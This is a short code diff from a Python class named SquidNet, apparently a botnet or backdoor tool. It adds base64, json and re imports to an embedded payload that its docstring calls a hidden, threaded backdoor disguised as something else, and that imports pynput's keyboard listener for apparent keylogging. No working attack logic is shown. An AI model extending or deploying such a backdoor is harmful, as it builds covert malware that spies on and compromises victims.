@@ -1377,7 +1377,7 @@ class SquidNet:
         The payload itself is expandable and threaded, which means you could have another script running as the payload
         is doing its job. It makes the backdoor more hidden and appears to be something else."""
         payload = """
-import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3, string
+import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3, string, base64, json, re
 try:
     from pynput.keyboard import Listener # pip install pynput
 except:
